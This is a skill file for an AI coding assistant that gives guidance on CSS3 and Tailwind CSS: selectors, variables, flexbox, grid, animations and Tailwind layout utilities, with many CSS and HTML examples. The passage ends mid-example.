---
name: css-tailwind
description: Expert guidance for CSS3, Tailwind CSS v3/v4, responsive design, animations, and modern styling best practices
version: 1.0.2
tags: [css, tailwind, styling, responsive, animations, accessibility, utility-first]
trigger_keywords: [sk-css-tailwind, css, tailwind, styling, responsive, animations, "css expert", "tailwind expert", "CSS and Tailwind Expert"]
globs:
  - "**/*.css"
  - "**/*.scss"
  - "**/*.sass"
  - "**/*.less"
  - "**/*.pcss"
  - "**/*.postcss"
  - "**/tailwind.config.*"
  - "**/postcss.config.*"
  - "**/*.vue"
  - "**/*.blade.php"
  - "**/*.html"
---
# CSS and Tailwind Expert Skill

You are an expert in CSS3 and Tailwind CSS, specializing in modern responsive design, animations, accessibility, and utility-first styling approaches.

## When to Use

Use this skill when:

1. **Styling Vue/Blade Components** - Adding styles to Laravel Inertia or Blade templates
2. **Building Responsive Layouts** - Creating mobile-first responsive designs
3. **Implementing Design Systems** - Setting up Tailwind configuration and design tokens
4. **Creating Animations** - Adding CSS transitions, keyframe animations, and micro-interactions
5. **Solving Layout Problems** - Using Flexbox and Grid for complex layouts
6. **Ensuring Accessibility** - Implementing proper focus states and color contrast
7. **Building UI Components** - Creating buttons, cards, modals, forms with Tailwind
8. **Dark Mode Implementation** - Setting up light/dark theme switching
9. **Performance Optimization** - Reducing CSS bundle size and avoiding repaints
10. **Debugging CSS Issues** - Fixing specificity conflicts, z-index problems, overflow issues

## Core Principles

### Design Philosophy
- Mobile-first responsive design
- Consistent spacing and typography scales
- Accessible color contrast and focus states
- Performance-conscious styling (minimize repaints/reflows)
- Maintainable and scalable CSS architecture

### Tailwind Philosophy
- Utility-first approach for rapid development
- Extract components when patterns repeat
- Use design tokens (theme configuration) for consistency
- Leverage JIT (Just-in-Time) compilation for arbitrary values
- Prefer Tailwind utilities over custom CSS when possible

## CSS3 Fundamentals

### Modern Selectors
```css
/* Attribute selectors */
[data-state="active"] { /* ... */ }
[href^="https://"] { /* starts with */ }
[href$=".pdf"] { /* ends with */ }
[class*="btn-"] { /* contains */ }

/* Pseudo-classes */
:is(h1, h2, h3) { /* matches any */ }
:where(h1, h2, h3) { /* zero specificity match */ }
:has(.child) { /* parent selector */ }
:not(.excluded) { /* negation */ }
:focus-visible { /* keyboard focus only */ }
:focus-within { /* parent with focused child */ }

/* Pseudo-elements */
::before, ::after { content: ''; }
::placeholder { color: gray; }
::selection { background: blue; color: white; }
::marker { color: red; } /* list bullets */

/* Structural selectors */
:first-child, :last-child
:nth-child(odd), :nth-child(even)
:nth-child(3n+1) { /* every 3rd starting at 1 */ }
:nth-of-type(2) { /* 2nd of its type */ }
:empty { /* no children */ }
```

### CSS Custom Properties (Variables)
```css
/* Define variables */
:root {
  /* Colors */
  --color-primary: #3b82f6;
  --color-primary-dark: #2563eb;
  --color-text: #1f2937;
  --color-text-muted: #6b7280;
  --color-background: #ffffff;

  /* Spacing scale */
  --space-xs: 0.25rem;
  --space-sm: 0.5rem;
  --space-md: 1rem;
  --space-lg: 1.5rem;
  --space-xl: 2rem;

  /* Typography */
  --font-sans: system-ui, -apple-system, sans-serif;
  --font-mono: ui-monospace, monospace;
  --text-sm: 0.875rem;
  --text-base: 1rem;
  --text-lg: 1.125rem;

  /* Shadows */
  --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
  --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1);

  /* Transitions */
  --transition-fast: 150ms ease;
  --transition-base: 200ms ease;
  --transition-slow: 300ms ease;

  /* Border radius */
  --radius-sm: 0.25rem;
  --radius-md: 0.375rem;
  --radius-lg: 0.5rem;
  --radius-full: 9999px;
}

/* Dark mode */
@media (prefers-color-scheme: dark) {
  :root {
    --color-text: #f3f4f6;
    --color-text-muted: #9ca3af;
    --color-background: #111827;
  }
}

/* Usage */
.card {
  background: var(--color-background);
  color: var(--color-text);
  padding: var(--space-lg);
  border-radius: var(--radius-lg);
  box-shadow: var(--shadow-md);
  transition: box-shadow var(--transition-base);
}

/* Fallback values */
.element {
  color: var(--undefined-color, #000);
}

/* Computed values */
.dynamic {
  --multiplier: 2;
  padding: calc(var(--space-md) * var(--multiplier));
}
```

### Flexbox
```css
/* Container */
.flex-container {
  display: flex;
  flex-direction: row; /* row | row-reverse | column | column-reverse */
  flex-wrap: wrap; /* nowrap | wrap | wrap-reverse */
  justify-content: space-between; /* flex-start | flex-end | center | space-between | space-around | space-evenly */
  align-items: center; /* flex-start | flex-end | center | baseline | stretch */
  align-content: flex-start; /* for multi-line */
  gap: 1rem; /* row-gap column-gap */
}

/* Items */
.flex-item {
  flex-grow: 1; /* share of extra space */
  flex-shrink: 0; /* shrink factor */
  flex-basis: 200px; /* initial size */
  /* shorthand: flex: grow shrink basis */
  flex: 1 0 auto;
  align-self: flex-end; /* override align-items */
  order: 1; /* visual order */
}

/* Common patterns */
.center-both {
  display: flex;
  justify-content: center;
  align-items: center;
}

.space-between {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.push-right {
  margin-left: auto;
}
```

### CSS Grid
```css
/* Basic grid */
.grid-container {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  grid-template-rows: auto 1fr auto;
  gap: 1rem;
}

/* Responsive grid */
.auto-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1.5rem;
}

.auto-fill-grid {
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
}

/* Named areas */
.layout {
  display: grid;
  grid-template-areas:
    "header header header"
    "sidebar main aside"
    "footer footer footer";
  grid-template-columns: 200px 1fr 200px;
  grid-template-rows: auto 1fr auto;
}

.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.aside { grid-area: aside; }
.footer { grid-area: footer; }

/* Item placement */
.grid-item {
  grid-column: 1 / 3; /* start / end */
  grid-row: span 2; /* span 2 rows */
  grid-column: 1 / -1; /* full width */
}

/* Alignment */
.grid-container {
  justify-items: center; /* horizontal alignment of items */
  align-items: center; /* vertical alignment of items */
  justify-content: space-between; /* horizontal distribution */
  align-content: start; /* vertical distribution */
}

.grid-item {
  justify-self: end;
  align-self: start;
}

/* Subgrid (modern browsers) */
.nested {
  display: grid;
  grid-template-columns: subgrid;
  grid-column: span 3;
}
```

### Modern Layout Features

#### Container Queries
```css
/* Define containment */
.card-container {
  container-type: inline-size;
  container-name: card;
}

/* Query the container */
@container card (min-width: 400px) {
  .card {
    display: flex;
    flex-direction: row;
  }
}

@container card (max-width: 399px) {
  .card {
    display: block;
  }
}

/* Container query units */
.card-title {
  font-size: clamp(1rem, 5cqw, 2rem);
}
```

#### Logical Properties
```css
/* Instead of physical properties */
.box {
  /* Block = vertical in horizontal writing mode */
  margin-block: 1rem; /* margin-top + margin-bottom */
  margin-block-start: 1rem; /* margin-top */
  margin-block-end: 1rem; /* margin-bottom */

  /* Inline = horizontal in horizontal writing mode */
  margin-inline: auto; /* margin-left + margin-right */
  padding-inline-start: 1rem; /* padding-left in LTR */
  padding-inline-end: 1rem; /* padding-right in LTR */

  /* Border */
  border-inline-start: 2px solid blue;

  /* Size */
  inline-size: 100%; /* width */
  block-size: auto; /* height */
  max-inline-size: 600px; /* max-width */
}
```

#### Aspect Ratio
```css
.video-container {
  aspect-ratio: 16 / 9;
  width: 100%;
}

.square {
  aspect-ratio: 1;
}

.card-image {
  aspect-ratio: 4 / 3;
  object-fit: cover;
}
```

### Typography
```css
/* Modern font stack */
body {
  font-family:
    system-ui,
    -apple-system,
    BlinkMacSystemFont,
    'Segoe UI',
    Roboto,
    'Helvetica Neue',
    Arial,
    sans-serif;
  line-height: 1.5;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

/* Fluid typography */
h1 {
  font-size: clamp(2rem, 5vw + 1rem, 4rem);
}

/* Text utilities */
.truncate {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.line-clamp-3 {
  display: -webkit-box;
  -webkit-line-clamp: 3;
  -webkit-box-orient: vertical;
  overflow: hidden;
}

.balance {
  text-wrap: balance; /* better headline wrapping */
}

.pretty {
  text-wrap: pretty; /* avoid orphans */
}
```

### Transitions and Animations
```css
/* Transitions */
.button {
  transition: all 200ms ease;
  /* Or be specific for performance */
  transition:
    background-color 200ms ease,
    transform 200ms ease,
    box-shadow 200ms ease;
}

/* Reduced motion */
@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}

/* Keyframe animations */
@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(-10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.fade-in {
  animation: fadeIn 300ms ease forwards;
}

@keyframes spin {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}

.spinner {
  animation: spin 1s linear infinite;
}

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}

.loading {
  animation: pulse 2s ease-in-out infinite;
}

/* Staggered animations */
.stagger > * {
  animation: fadeIn 300ms ease backwards;
}
.stagger > *:nth-child(1) { animation-delay: 0ms; }
.stagger > *:nth-child(2) { animation-delay: 100ms; }
.stagger > *:nth-child(3) { animation-delay: 200ms; }
```

### Transforms
```css
.transform-example {
  transform:
    translateX(10px)
    translateY(10px)
    rotate(45deg)
    scale(1.1)
    skewX(10deg);
  transform-origin: center center;
}

/* 3D transforms */
.card-3d {
  perspective: 1000px;
}

.card-inner {
  transform-style: preserve-3d;
  transition: transform 0.6s;
}

.card-3d:hover .card-inner {
  transform: rotateY(180deg);
}

.card-front,
.card-back {
  backface-visibility: hidden;
}

.card-back {
  transform: rotateY(180deg);
}
```

### Filters and Effects
```css
/* Blur */
.blur {
  filter: blur(4px);
}

.backdrop-blur {
  backdrop-filter: blur(10px);
  background: rgba(255, 255, 255, 0.8);
}

/* Other filters */
.filters {
  filter:
    brightness(1.1)
    contrast(1.1)
    saturate(1.2)
    grayscale(0.5)
    sepia(0.3)
    hue-rotate(90deg)
    invert(1)
    opacity(0.8)
    drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
}

/* Mix blend modes */
.blend {
  mix-blend-mode: multiply;
  /* or: screen, overlay, darken, lighten, etc. */
}

/* Clip path */
.clip {
  clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
  clip-path: circle(50% at center);
  clip-path: inset(10px 20px 30px 40px round 10px);
}
```

## Layout Utilities

This section covers Tailwind's powerful layout utilities for controlling element positioning, display behavior, and structural organization.

### 1. Display Utilities

Control how elements are displayed and participate in layout flows.

**Basic Display Types:**
```html
<!-- Block-level elements -->
<div class="block">Full width block element</div>

<!-- Inline-block elements -->
<span class="inline-block w-32 h-32">Respects width/height but flows inline</span>

<!-- Inline elements -->
<span class="inline">Flows with text, no width/height</span>

<!-- Flex containers -->
<div class="flex gap-4">
  <div>Item 1</div>
  <div>Item 2</div>
</div>

<!-- Inline flex -->
<div class="inline-flex gap-2">
  <button>Button 1</button>
  <button>Button 2</button>
</div>

<!-- Grid containers -->
<div class="grid grid-cols-3 gap-4">
  <div>Cell 1</div>
  <div>Cell 2</div>
  <div>Cell 3</div>
</div>

<!-- Inline grid -->
<div class="inline-grid grid-cols-2 gap-2">
  <div>A</div>
  <div>B</div>
</div>
```

**Visibility & Accessibility:**
```html
<!-- Hide element completely (removed from DOM flow) -->
<div class="hidden">Not visible, not in layout</div>

<!-- Screen reader only (accessible but visually hidden) -->
<span class="sr-only">Skip to main content</span>

<!-- Restore from sr-only -->
<button class="sr-only focus:not-sr-only">
  Visible when focused for keyboard users
</button>
```

**Special Display Types:**
```html
<!-- Contents (element acts as if it's not there, children become siblings) -->
<div class="contents">
  <div>These children</div>
  <div>act as siblings of parent</div>
</div>

<!-- Flow-root (creates new block formatting context) -->
<div class="flow-root">
  <div class="float-left">Float contained properly</div>
  <div>Other content</div>
</div>
```

**Table Display Utilities:**
```html
<!-- Table layout using divs -->
<div class="table w-full">
  <div class="table-header-group">
    <div class="table-row">
      <div class="table-cell px-4 py-2">Header 1</div>
      <div class="table-cell px-4 py-2">Header 2</div>
    </div>
  </div>
  <div class="table-row-group">
    <div class="table-row">
      <div class="table-cell px-4 py-2">Data 1</div>
      <div class="table-cell px-4 py-2">Data 2</div>
    </div>
  </div>
</div>

<!-- Other table utilities: table-caption, table-column, table-column-group, table-footer-group -->
```

### 2. Position Utilities

Control element positioning and placement within the document flow.

**Position Types:**
```html
<!-- Static (default, normal flow) -->
<div class="static">Normal document flow</div>

<!-- Relative (offset from normal position, space reserved) -->
<div class="relative top-4 left-4">
  Moved 1rem down and right, space reserved
</div>

<!-- Absolute (removed from flow, positioned relative to nearest positioned ancestor) -->
<div class="relative h-64 bg-gray-200">
  <div class="absolute top-0 right-0 bg-blue-500 p-4">
    Positioned in top-right corner
  </div>
</div>

<!-- Fixed (relative to viewport, stays on screen during scroll) -->
<header class="fixed top-0 left-0 right-0 bg-white shadow-md z-50">
  Fixed header that stays at top
</header>

<!-- Sticky (hybrid of relative and fixed) -->
<div class="sticky top-0 bg-white">
  Sticks to top when scrolling past it
</div>
```

**Inset Utilities (position offsets):**
```html
<!-- All sides at once -->
<div class="absolute inset-0">Fills entire parent (top/right/bottom/left: 0)</div>

<!-- Horizontal inset -->
<div class="absolute inset-x-0 top-0 h-16">
  Full width at top (left: 0, right: 0)
</div>

<!-- Vertical inset -->
<div class="absolute inset-y-0 left-0 w-64">
  Full height on left (top: 0, bottom: 0)
</div>

<!-- Individual sides -->
<div class="absolute top-4 right-4">Top-right corner with spacing</div>
<div class="absolute bottom-0 left-0">Bottom-left corner</div>

<!-- Negative values -->
<div class="relative">
  <div class="absolute -top-4 -right-4 bg-red-500 rounded-full w-6 h-6">
    Badge positioned outside parent
  </div>
</div>

<!-- Arbitrary values -->
<div class="absolute top-[117px] left-[50%]">Precise positioning</div>

<!-- Percentage values -->
<div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
  Perfectly centered
</div>
```

**Practical Positioning Examples:**
```html
<!-- Modal overlay -->
<div class="fixed inset-0 bg-black/50 z-40"></div>

<!-- Floating action button -->
<button class="fixed bottom-8 right-8 bg-blue-500 rounded-full p-4 shadow-lg z-50">
  <svg class="w-6 h-6"><!-- Icon --></svg>
</button>

<!-- Sticky navigation -->
<nav class="sticky top-0 bg-white shadow z-30">
  <ul class="flex gap-4 p-4">
    <li><a href="#home">Home</a></li>
    <li><a href="#about">About</a></li>
  </ul>
</nav>

<!-- Absolutely positioned badge -->
<div class="relative inline-block">
  <button class="bg-blue-500 px-4 py-2 rounded">
    Messages
  </button>
  <span class="absolute -top-2 -right-2 bg-red-500 text-white text-xs rounded-full w-5 h-5 flex items-center justify-center">
    3
  </span>
</div>
```

### 3. Box Sizing & Overflow

Control how box dimensions are calculated and content overflow behavior.

**Box Sizing:**
```html
<!-- Border-box (default in Tailwind, includes padding and border in width) -->
<div class="box-border w-32 p-4 border-4">
  Width includes padding and border
</div>

<!-- Content-box (width applies to content only) -->
<div class="box-content w-32 p-4 border-4">
  Width is content only, padding/border add to total
</div>
```

**Overflow Utilities:**
```html
<!-- Auto (scrollbar only when needed) -->
<div class="overflow-auto h-64 w-64">
  <p>Long content that may overflow...</p>
</div>

<!-- Hidden (clip overflow, no scrollbar) -->
<div class="overflow-hidden h-64 w-64">
  <img src="large-image.jpg" alt="Cropped image">
</div>

<!-- Scroll (always show scrollbars) -->
<div class="overflow-scroll h-64 w-64">
  <div class="w-[500px] h-[500px]">Large content</div>
</div>

<!-- Visible (overflow not clipped, may extend outside) -->
<div class="overflow-visible">
  <div class="absolute -top-4">Extends outside</div>
</div>

<!-- Directional overflow -->
<div class="overflow-x-auto overflow-y-hidden h-32 w-64">
  <div class="w-[1000px]">Scrolls horizontally only</div>
</div>

<div class="overflow-x-hidden overflow-y-scroll h-64 w-64">
  <div class="h-[1000px]">Scrolls vertically only</div>
</div>
```

**Overscroll Behavior (scroll boundary behavior):**
```html
<!-- Auto (default browser behavior, allows scroll chaining) -->
<div class="overscroll-auto overflow-auto h-64">
  Default scroll behavior
</div>

<!-- Contain (prevents scroll chaining to parent) -->
<div class="overscroll-contain overflow-auto h-64">
  Scroll stops at boundaries, no parent scroll
</div>

<!-- None (prevents scroll chaining and bounce effects) -->
<div class="overscroll-none overflow-auto h-64">
  No bounce effect on mobile
</div>

<!-- Directional overscroll -->
<div class="overscroll-x-contain overscroll-y-auto overflow-auto">
  Contain horizontal, auto vertical
</div>
```

**Practical Examples:**
```html
<!-- Scrollable card with contained scroll -->
<div class="bg-white rounded-lg shadow-lg">
  <div class="p-4 border-b">
    <h3 class="font-bold">Chat Messages</h3>
  </div>
  <div class="overflow-y-auto overscroll-contain h-96 p-4">
    <!-- Messages here -->
  </div>
</div>

<!-- Horizontal scrolling gallery -->
<div class="overflow-x-auto overscroll-x-contain whitespace-nowrap py-4">
  <div class="inline-block w-64 h-40 bg-gray-200 mx-2"></div>
  <div class="inline-block w-64 h-40 bg-gray-300 mx-2"></div>
  <div class="inline-block w-64 h-40 bg-gray-400 mx-2"></div>
</div>

<!-- Cropped image container -->
<div class="overflow-hidden rounded-lg w-64 h-64">
  <img src="image.jpg" class="w-full h-full object-cover hover:scale-110 transition-transform">
</div>
```

### 4. Z-Index

Control stacking order of positioned elements.

**Z-Index Scale:**
```html
<!-- Default z-index values (0, 10, 20, 30, 40, 50) -->
<div class="relative z-0">Base layer (z-index: 0)</div>
<div class="relative z-10">Low priority (z-index: 10)</div>
<div class="relative z-20">Medium-low (z-index: 20)</div>
<div class="relative z-30">Medium (z-index: 30)</div>
<div class="relative z-40">Medium-high (z-index: 40)</div>
<div class="relative z-50">High priority (z-index: 50)</div>

<!-- Auto (browser default) -->
<div class="relative z-auto">Auto stacking</div>

<!-- Negative z-index (behind parent) -->
<div class="relative">
  <div class="absolute -z-10 inset-0 bg-gradient-to-r from-blue-500 to-purple-500">
    Background layer behind parent content
  </div>
  <div class="relative z-0 p-8">
    Content on top
  </div>
</div>

<!-- Arbitrary values -->
<div class="fixed z-[100]">Very high priority</div>
<div class="absolute z-[999]">Maximum priority</div>
```

**Practical Z-Index Layering:**
```html
<!-- Typical z-index hierarchy -->
<div class="relative">
  <!-- Base content (z-0) -->
  <main class="relative z-0">
    Content
  </main>

  <!-- Sticky elements (z-10) -->
  <nav class="sticky top-0 z-10 bg-white">
    Navigation
  </nav>

  <!-- Dropdowns (z-20) -->
  <div class="absolute z-20">
    <div class="dropdown-menu">Dropdown items</div>
  </div>

  <!-- Tooltips (z-30) -->
  <div class="absolute z-30 bg-black text-white px-2 py-1 rounded">
    Tooltip
  </div>

  <!-- Modal backdrop (z-40) -->
  <div class="fixed inset-0 bg-black/50 z-40"></div>

  <!-- Modal content (z-50) -->
  <div class="fixed inset-0 flex items-center justify-center z-50">
    <div class="bg-white rounded-lg p-6">Modal</div>
  </div>
</div>
```

**Common Z-Index Patterns:**
```html
<!-- Decorative background element -->
<div class="relative overflow-hidden">
  <div class="absolute -z-10 top-0 right-0 w-64 h-64 bg-blue-500 rounded-full blur-3xl opacity-20">
    Decorative blob
  </div>
  <div class="relative z-0 p-8">
    Content appears above decoration
  </div>
</div>

<!-- Layered card effect -->
<div class="relative">
  <div class="absolute -z-10 inset-0 translate-x-2 translate-y-2 bg-gray-300 rounded-lg"></div>
  <div class="relative z-0 bg-white rounded-lg p-6 shadow">
    Card with shadow layer
  </div>
</div>
```

### 5. Object Fit & Position

Control how images and videos fit within their containers.

**Object Fit:**
```html
<!-- Contain (fit entire image, may have empty space) -->
<img src="image.jpg" class="w-64 h-64 object-contain bg-gray-100" alt="Contained image">

<!-- Cover (fill container, may crop image) -->
<img src="image.jpg" class="w-64 h-64 object-cover" alt="Covered image">

<!-- Fill (stretch to fill, may distort) -->
<img src="image.jpg" class="w-64 h-64 object-fill" alt="Filled image">

<!-- None (ignore container size, use natural size) -->
<img src="image.jpg" class="w-64 h-64 object-none" alt="Natural size">

<!-- Scale-down (smaller of none or contain) -->
<img src="image.jpg" class="w-64 h-64 object-scale-down" alt="Scaled down">
```

**Object Position:**
```html
<!-- Position within container -->
<img src="image.jpg" class="w-64 h-64 object-cover object-center" alt="Centered">
<img src="image.jpg" class="w-64 h-64 object-cover object-top" alt="Top aligned">
<img src="image.jpg" class="w-64 h-64 object-cover object-bottom" alt="Bottom aligned">
<img src="image.jpg" class="w-64 h-64 object-cover object-left" alt="Left aligned">
<img src="image.jpg" class="w-64 h-64 object-cover object-right" alt="Right aligned">

<!-- Corner positions -->
<img src="image.jpg" class="w-64 h-64 object-cover object-left-top" alt="Top-left">
<img src="image.jpg" class="w-64 h-64 object-cover object-right-bottom" alt="Bottom-right">

<!-- Arbitrary position -->
<img src="image.jpg" class="w-64 h-64 object-cover object-[25%_75%]" alt="Custom position">
```

**Practical Examples:**
```html
<!-- Avatar image (always centered, cropped) -->
<div class="w-16 h-16 rounded-full overflow-hidden">
  <img src="avatar.jpg" class="w-full h-full object-cover object-center" alt="User avatar">
</div>

<!-- Product card image -->
<div class="bg-white rounded-lg shadow overflow-hidden">
  <div class="aspect-square overflow-hidden">
    <img src="product.jpg" class="w-full h-full object-cover object-center hover:scale-110 transition-transform" alt="Product">
  </div>
  <div class="p-4">
    <h3 class="font-bold">Product Name</h3>
  </div>
</div>

<!-- Hero background image -->
<div class="relative h-96 overflow-hidden">
  <img src="hero.jpg" class="absolute inset-0 w-full h-full object-cover object-center" alt="Hero">
  <div class="relative z-10 flex items-center justify-center h-full">
    <h1 class="text-white text-4xl font-bold">Welcome</h1>
  </div>
</div>

<!-- Video player -->
<div class="aspect-video bg-black">
  <video class="w-full h-full object-contain" controls>
    <source src="video.mp4" type="video/mp4">
  </video>
</div>
```

### 6. Aspect Ratio

Control the aspect ratio of elements for consistent sizing.

**Built-in Ratios:**
```html
<!-- Auto (natural aspect ratio) -->
<div class="aspect-auto">
  Content determines size
</div>

<!-- Square (1:1) -->
<div class="aspect-square bg-blue-500">
  Always square
</div>

<!-- Video (16:9) -->
<div class="aspect-video bg-black">
  <iframe src="video" class="w-full h-full"></iframe>
</div>
```

**Custom Aspect Ratios:**
```html
<!-- 4:3 ratio (traditional photos) -->
<div class="aspect-[4/3] bg-gray-200">
  4:3 ratio container
</div>

<!-- 16:9 ratio -->
<div class="aspect-[16/9] bg-gray-200">
  16:9 ratio container
</div>

<!-- 21:9 ratio (ultrawide) -->
<div class="aspect-[21/9] bg-gray-200">
  21:9 ratio container
</div>

<!-- 2:3 ratio (portrait) -->
<div class="aspect-[2/3] bg-gray-200">
  Portrait ratio
</div>

<!-- 1:2 ratio (tall) -->
<div class="aspect-[1/2] bg-gray-200">
  Tall ratio
</div>
```

**Practical Examples:**
```html
<!-- Responsive image grid with consistent ratios -->
<div class="grid grid-cols-3 gap-4">
  <div class="aspect-square bg-gray-200 overflow-hidden">
    <img src="image1.jpg" class="w-full h-full object-cover" alt="Image 1">
  </div>
  <div class="aspect-square bg-gray-200 overflow-hidden">
    <img src="image2.jpg" class="w-full h-full object-cover" alt="Image 2">
  </div>
  <div class="aspect-square bg-gray-200 overflow-hidden">
    <img src="image3.jpg" class="w-full h-full object-cover" alt="Image 3">
  </div>
</div>

<!-- Video embed with aspect ratio -->
<div class="aspect-video w-full max-w-4xl mx-auto">
  <iframe
    class="w-full h-full"
    src="https://www.youtube.com/embed/dQw4w9WgXcQ"
    frameborder="0"
    allowfullscreen>
  </iframe>
</div>

<!-- Product cards with different ratios -->
<div class="grid grid-cols-2 gap-4">
  <!-- Portrait product -->
  <div class="bg-white rounded-lg overflow-hidden shadow">
    <div class="aspect-[3/4] bg-gray-100">
      <img src="product.jpg" class="w-full h-full object-cover" alt="Product">
    </div>
    <div class="p-4">
      <h3>Product Name</h3>
    </div>
  </div>

  <!-- Landscape product -->
  <div class="bg-white rounded-lg overflow-hidden shadow">
    <div class="aspect-[4/3] bg-gray-100">
      <img src="product2.jpg" class="w-full h-full object-cover" alt="Product">
    </div>
    <div class="p-4">
      <h3>Product Name</h3>
    </div>
  </div>
</div>

<!-- Social media post format -->
<div class="max-w-md mx-auto bg-white rounded-lg shadow">
  <!-- Square Instagram-style post -->
  <div class="aspect-square overflow-hidden">
    <img src="post.jpg" class="w-full h-full object-cover" alt="Post">
  </div>
  <div class="p-4">
    <p>Post content...</p>
  </div>
</div>
```

### 7. Columns

Create multi-column layouts like newspapers or magazines.

**Column Count:**
```html
<!-- Fixed column count -->
<div class="columns-1">Single column</div>
<div class="columns-2">Two columns</div>
<div class="columns-3">Three columns</div>
<div class="columns-4">Four columns</div>
<!-- ... up to columns-12 -->

<!-- Auto columns (browser decides) -->
<div class="columns-auto">
  Auto column count
</div>
```

**Column Width:**
```html
<!-- Sized columns (3xs to 7xl) -->
<div class="columns-3xs">Very narrow columns (~16rem)</div>
<div class="columns-2xs">Extra small columns (~18rem)</div>
<div class="columns-xs">Small columns (~20rem)</div>
<div class="columns-sm">Small-medium columns (~24rem)</div>
<div class="columns-md">Medium columns (~28rem)</div>
<div class="columns-lg">Large columns (~32rem)</div>
<div class="columns-xl">Extra large columns (~36rem)</div>
<div class="columns-2xl">2XL columns (~42rem)</div>
<div class="columns-3xl">3XL columns (~48rem)</div>
<div class="columns-4xl">4XL columns (~56rem)</div>
<div class="columns-5xl">5XL columns (~64rem)</div>
<div class="columns-6xl">6XL columns (~72rem)</div>
<div class="columns-7xl">7XL columns (~80rem)</div>
```

**Break Utilities:**
```html
<!-- Break after element -->
<div class="columns-2">
  <p>First paragraph</p>
  <p class="break-after-column">Break after this</p>
  <p>Starts in new column</p>
</div>

<!-- Break before element -->
<div class="columns-2">
  <p>First paragraph</p>
  <p class="break-before-column">Break before this</p>
</div>

<!-- Break inside prevention -->
<div class="columns-2">
  <div class="break-inside-avoid">
    <h3>Heading</h3>
    <p>This block stays together</p>
  </div>
</div>

<!-- Other break values -->
<div class="break-after-auto">Auto break after</div>
<div class="break-after-avoid">Avoid break after</div>
<div class="break-after-all">Break after (all contexts)</div>
<div class="break-after-page">Page break after (print)</div>
<div class="break-after-left">Left page break (print)</div>
<div class="break-after-right">Right page break (print)</div>

<!-- Similarly: break-before-*, break-inside-* -->
```

**Practical Column Examples:**
```html
<!-- Newspaper-style article -->
<article class="columns-3 gap-8 text-justify">
  <h1 class="column-span-all text-4xl font-bold mb-4">Article Title</h1>
  <p class="mb-4">Lorem ipsum dolor sit amet, consectetur adipiscing elit...</p>
  <p class="mb-4">Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua...</p>
  <div class="break-inside-avoid bg-gray-100 p-4 my-4">
    <h3 class="font-bold mb-2">Info Box</h3>
    <p>This stays together across columns</p>
  </div>
  <p>More content...</p>
</article>

<!-- Responsive columns -->
<div class="columns-1 md:columns-2 lg:columns-3 gap-6">
  <div class="mb-6 break-inside-avoid">
    <img src="image1.jpg" class="w-full rounded-lg mb-2" alt="Image 1">
    <p class="text-sm">Caption for image 1</p>
  </div>
  <div class="mb-6 break-inside-avoid">
    <img src="image2.jpg" class="w-full rounded-lg mb-2" alt="Image 2">
    <p class="text-sm">Caption for image 2</p>
  </div>
  <div class="mb-6 break-inside-avoid">
    <img src="image3.jpg" class="w-full rounded-lg mb-2" alt="Image 3">
    <p class="text-sm">Caption for image 3</p>
  </div>
</div>

<!-- Pinterest-style masonry layout -->
<div class="columns-2 md:columns-3 lg:columns-4 gap-4">
  <div class="break-inside-avoid mb-4">
    <img src="pin1.jpg" class="w-full rounded-lg" alt="Pin 1">
  </div>
  <div class="break-inside-avoid mb-4">
    <img src="pin2.jpg" class="w-full rounded-lg" alt="Pin 2">
  </div>
  <div class="break-inside-avoid mb-4">
    <img src="pin3.jpg" class="w-full rounded-lg" alt="Pin 3">
  </div>
  <!-- More items -->
</div>
```

### 8. Visibility

Control visibility without affecting layout flow.

```html
<!-- Visible (default) -->
<div class="visible">Element is visible</div>

<!-- Invisible (hidden but space reserved) -->
<div class="invisible">
  Hidden but takes up space in layout
</div>

<!-- Collapse (for table elements, like visibility: collapse) -->
<table>
  <tr class="collapse">Hidden table row with collapsed space</tr>
  <tr><td>Visible row</td></tr>
</table>
```

**Visibility vs Hidden vs Opacity:**
```html
<!-- hidden: Removed from layout completely -->
<div class="hidden">Not in layout at all (display: none)</div>

<!-- invisible: In layout but not visible -->
<div class="invisible">Takes space but not visible (visibility: hidden)</div>

<!-- opacity-0: In layout, not visible, but interactive -->
<button class="opacity-0">
  Takes space, not visible, but still clickable
</button>

<!-- Practical use: Fade in/out animations -->
<div class="opacity-0 hover:opacity-100 transition-opacity">
  Fades in on hover
</div>

<div class="invisible group-hover:visible transition-all">
  Becomes visible on parent hover
</div>
```

**Conditional Visibility:**
```html
<!-- Show/hide on different screen sizes -->
<div class="visible md:invisible lg:visible">
  Visible on mobile and large screens, hidden on tablets
</div>

<!-- Accessibility: visible to screen readers only -->
<div class="sr-only">Only for screen readers</div>

<!-- Focus-visible pattern -->
<button class="focus:visible">Visible when focused</button>
```

### 9. Isolation

Control whether elements create new stacking contexts.

```html
<!-- Isolate (creates new stacking context, isolation: isolate) -->
<div class="isolate">
  <div class="relative z-10">Isolated stacking context</div>
  <div class="relative z-20">Z-index relative to parent only</div>
</div>

<!-- Auto (default, no isolation) -->
<div class="isolation-auto">
  Normal stacking behavior
</div>
```

**Practical Use Cases:**
```html
<!-- Prevent blend mode from affecting siblings -->
<div class="flex gap-4">
  <div class="isolate">
    <div class="mix-blend-multiply bg-red-500 p-8">
      Blend mode isolated to this container
    </div>
  </div>
  <div class="bg-blue-500 p-8">
    Not affected by sibling's blend mode
  </div>
</div>

<!-- Control z-index stacking independently -->
<div class="relative">
